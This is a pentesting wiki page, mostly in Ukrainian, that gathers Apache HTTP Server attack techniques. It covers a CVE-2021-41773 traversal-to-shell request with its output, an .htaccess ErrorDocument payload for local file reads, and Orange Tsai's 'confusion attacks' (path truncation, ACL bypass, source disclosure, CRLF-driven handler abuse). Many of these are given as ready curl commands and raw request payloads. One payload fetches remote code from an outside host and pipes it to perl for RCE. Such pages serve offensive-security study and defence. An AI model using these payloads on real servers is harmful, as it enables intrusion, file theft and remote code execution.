# Apache

{{#include ../../banners/hacktricks-training.md}}

## Виконувані PHP розширення

Дізнайтеся, які розширення виконує сервер Apache. Щоб знайти їх, ви можете виконати:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
Також, деякі місця, де ви можете знайти цю конфігурацію:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
## LFI via .htaccess ErrorDocument file provider (ap_expr)

Якщо ви можете контролювати .htaccess каталогу і AllowOverride включає FileInfo для цього шляху, ви можете перетворити відповіді 404 на довільне читання локальних файлів, використовуючи функцію ap_expr file() всередині ErrorDocument.

- Вимоги:
- Apache 2.4 з увімкненим парсером виразів (ap_expr) (за замовчуванням у 2.4).
- vhost/dir має дозволяти .htaccess встановлювати ErrorDocument (AllowOverride FileInfo).
- Користувач Apache worker повинен мати права читання на цільовий файл.

.htaccess payload:
```apache
# Optional marker header just to identify your tenant/request path
Header always set X-Debug-Tenant "demo"
# On any 404 under this directory, return the contents of an absolute filesystem path
ErrorDocument 404 %{file:/etc/passwd}
```
Спрацює при запиті будь-якого неіснуючого шляху в цій директорії, наприклад при зловживанні userdir-style hosting:
```bash
curl -s http://target/~user/does-not-exist | sed -n '1,20p'
```
Примітки та поради:
- Працюють лише абсолютні шляхи. Вміст повертається як тіло відповіді для 404 handler.
- Ефективні права читання — ті, що має Apache user (зазвичай www-data/apache). Ви не зможете прочитати /root/* або /etc/shadow у стандартних налаштуваннях.
- Навіть якщо .htaccess належить root, якщо батьківський каталог tenant-owned і дозволяє перейменування, ви можете перейменувати оригінальний .htaccess і завантажити власну заміну через SFTP/FTP:
- rename .htaccess .htaccess.bk
- put your malicious .htaccess
- Використовуйте це, щоб читати код застосунку під DocumentRoot або vhost config paths для збору секретів (DB creds, API keys, тощо).

## Confusion Attack <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

These types of attacks has been introduced and documented [**by Orange in this blog post**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) and the following is a summary. The "confusion" attack basically abuses how the tens of modules that work together creating a Apache don't work perfectly synchronised and making some of them modify some unexpected data can cause a vulnerability in a later module.

### Filename Confusion

#### Truncation

The **`mod_rewrite`** will trim the content of `r->filename` after the character `?` ([_**modules/mappers/mod_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)). This isn't totally wrong as most modules will treat `r->filename` as an URL. Bur in other occasions this will be treated as file path, which would cause a problem.

- **Path Truncation**

Можна зловживати `mod_rewrite`, як у наведеному нижче прикладі правила, щоб отримати доступ до інших файлів у файловій системі, видаляючи останню частину очікуваного шляху простим додаванням `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
# the output of file `/var/user/orange/secret.yml`
```
- **Mislead RewriteFlag Assignment**

У наведеному нижче правилі перепису, поки URL закінчується на .php, він буде розглядатися і виконуватися як php. Отже, можливо надіслати URL, що закінчується на .php після символу `?`, при цьому в шляху завантажити інший тип файлу (наприклад, зображення) з вкладеним шкідливим php-кодом:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL Bypass**

Можливо отримати доступ до файлів, до яких користувач не повинен мати доступ, навіть якщо доступ має бути заборонений за допомогою конфігурацій на кшталт:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
Це тому, що за замовчуванням PHP-FPM отримує URL-и, що закінчуються на `.php`, наприклад `http://server/admin.php%3Fooo.php`, і оскільки PHP-FPM видаляє все, що йде після символу `?`, попередній URL дозволить завантажити `/admin.php`, навіть якщо попереднє правило це забороняло.

### Плутанина з DocumentRoot
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
A fun fact about Apache is that the previous rewrite will try to access the file from both the documentRoot and from root. So, a request to `https://server/abouth.html` will check for the file in `/var/www/html/about.html` and `/about.html` in the file system. Which basically can be abused to access files in the file system.

#### **Розкриття вихідного коду на стороні сервера**

- **Розкриття вихідного коду CGI**

Достатньо просто додати %3F в кінці, щоб leak вихідний код cgi модуля:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
- **Розкриття PHP Source Code**

Якщо на сервері є кілька доменів, один із яких є статичним, це можна використати для обходу файлової системи та leak php code:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Local Gadgets Manipulation**

Головна проблема з попереднім attack полягає в тому, що за замовчуванням більшість доступу до filesystem буде заборонено, як у Apache HTTP Server’s [configuration template](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115):
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
Однак [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) операційні системи за замовчуванням дозволяють `/usr/share`:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Тому можливо зловживати файлами, розташованими всередині `/usr/share` у цих дистрибутивах.

**Local Gadget to Information Disclosure**

- **Apache HTTP Server** з **websocketd** може виставляти скрипт **dump-env.php** за шляхом **/usr/share/doc/websocketd/examples/php/**, який може leak чутливі змінні оточення.
- Сервери з **Nginx** або **Jetty** можуть виставляти чутливу інформацію веб-застосунків (наприклад, **web.xml**) через свої стандартні web root'и, розміщені під **/usr/share**:
- **/usr/share/nginx/html/**
- **/usr/share/jetty9/etc/**
- **/usr/share/jetty9/webapps/**

**Local Gadget to XSS**

- На Ubuntu Desktop з встановленим **LibreOffice**, використання можливості перемикання мови у help files може призвести до **Cross-Site Scripting (XSS)**. Маніпулювання URL у **/usr/share/libreoffice/help/help.html** може перенаправляти на шкідливі сторінки або старі версії через небезпечний RewriteRule.

**Local Gadget to LFI**

- Якщо PHP або певні front-end пакети, такі як **JpGraph** або **jQuery-jFeed**, встановлені, їхні файли можна використати для читання чутливих файлів, наприклад **/etc/passwd**:
- **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
- **/usr/share/javascript/jquery-jfeed/proxy.php**
- **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Local Gadget to SSRF**

- Використовуючи **MagpieRSS**'s **magpie_debug.php** за шляхом **/usr/share/php/magpierss/scripts/magpie_debug.php**, можна легко створити вразливість SSRF, що відкриває шлях до подальших експлойтів.

**Local Gadget to RCE**

- Можливостей для **Remote Code Execution (RCE)** дуже багато — вразливі інсталяції, такі як застарілий **PHPUnit** або **phpLiteAdmin**, можуть бути використані для виконання довільного коду, що демонструє широкий потенціал маніпуляції локальними гаджетами.

#### **Jailbreak from Local Gadgets**

Також можливий Jailbreak з дозволених папок, слідуючи по symlinks, створених встановленим ПО в цих папках, наприклад:

- **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
- **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
- **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
- **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
- **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Більше того, зловживання symlinks дозволило отримати **RCE** у Redmine.

### Handler Confusion <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Ця атака експлуатує перекриття функціональності між директивами `AddHandler` і `AddType`, які обидві можуть бути використані для **увімкнення обробки PHP**. Спочатку ці директиви впливали на різні поля (`r->handler` та `r->content_type` відповідно) у внутрішній структурі сервера. Однак через успадкований код Apache обробляє ці директиви взаємозамінно за певних умов, перетворюючи `r->content_type` у `r->handler`, якщо перше встановлено, а друге — ні.

Крім того, в Apache HTTP Server (`server/config.c#L420`), якщо `r->handler` порожній перед виконанням `ap_run_handler()`, сервер **використовує `r->content_type` як handler**, фактично роблячи `AddType` і `AddHandler` ідентичними за ефектом.

#### **Overwrite Handler to Disclose PHP Source Code**

У [**цій доповіді**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf) була представлена вразливість, коли некоректний `Content-Length`, надісланий клієнтом, може спричинити помилкове **повернення PHP source code** сервером. Причина полягала в проблемі обробки помилок у ModSecurity та Apache Portable Runtime (APR), коли подвійна відповідь призводить до перезапису `r->content_type` на `text/html`.\
Оскільки ModSecurity не правильно обробляє значення повернення, воно повертає PHP-код і не інтерпретує його.

#### **Overwrite Handler to XXXX**

TODO: Orange ще не розкрила цю вразливість

### **Invoke Arbitrary Handlers**

Якщо атакувальник може контролювати заголовок **`Content-Type`** у відповіді сервера, він зможе **викликати довільні обробники модулів**. Проте до моменту, коли атакуючий це контролює, більша частина процесу обробки запиту вже буде виконана. Однак можливо **перезапустити процес обробки запиту, зловживаючи заголовком `Location`**, оскільки якщо повернений `Status` — 200 і заголовок `Location` починається з `/`, відповідь трактуються як Server-Side Redirection і повинна бути оброблена

Згідно з [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (специфікація про CGI) у [Section 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) визначено поведінку Local Redirect Response:

> The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.

Отже, для виконання цієї атаки потрібна одна з наступних вразливостей:

- CRLF Injection у заголовках відповіді CGI
- SSRF з повним контролем над заголовками відповіді

#### **Arbitrary Handler to Information Disclosure**

Наприклад `/server-status` має бути доступним лише локально:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
Можна отримати до нього доступ, встановивши `Content-Type` на `server-status` та заголовок Location, що починається з `/`
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Від довільного обробника до повного SSRF**

Перенаправлення на `mod_proxy` для доступу до будь-якого протоколу за будь-яким URL:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
Однак додається заголовок `X-Forwarded-For`, який перешкоджає доступу до cloud metadata endpoints.

#### **Довільний обробник для доступу до локального Unix Domain Socket**

Отримайте доступ до локального Unix Domain Socket PHP-FPM, щоб виконати PHP backdoor, розташований у `/tmp/`:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Довільний handler для RCE**

Офіційний образ [PHP Docker](https://hub.docker.com/_/php) включає PEAR (`Pearcmd.php`) — інструмент управління PHP-пакетами через командний рядок, яким можна зловживати для отримання RCE:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Перегляньте [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), написану [Phith0n](https://x.com/phithon_xg), для деталей цієї техніки.

## Посилання

- [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)
- [Apache 2.4 Custom Error Responses (ErrorDocument)](https://httpd.apache.org/docs/2.4/custom-error.html)
- [Apache 2.4 Expressions and functions (file:)](https://httpd.apache.org/docs/2.4/expr.html)
- [HTB Zero write-up: .htaccess ErrorDocument LFI and cron pgrep abuse](https://0xdf.gitlab.io/2025/08/12/htb-zero.html)

{{#include ../../banners/hacktricks-training.md}}
